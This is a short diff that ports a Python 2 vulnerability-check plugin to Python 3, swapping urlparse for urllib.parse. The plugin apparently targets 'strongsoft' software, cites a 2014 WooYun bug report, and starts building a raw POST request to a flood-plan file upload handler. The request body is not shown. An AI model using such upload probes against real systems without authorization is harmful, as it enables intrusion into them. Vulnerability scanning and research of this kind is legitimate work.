@@ -2,13 +2,13 @@
 # -*- coding: utf-8 -*-
 #__Author__ = treeoph
 #__Refer___ = http://wooyun.org/bugs/wooyun-2014-063623
-import re,urlparse
+import re,urllib.parse
 def assign(service, arg):
     if service=='strongsoft':
         return True,arg
 
 def audit(arg):
-    p=urlparse.urlparse(arg)
+    p=urllib.parse.urlparse(arg)
     raw="""POST /plan/AjaxHandle/UpLoadFloodPlanFile.ashx?doc=plan HTTP/1.1
 Host: {netloc}
 Content-Length: 537
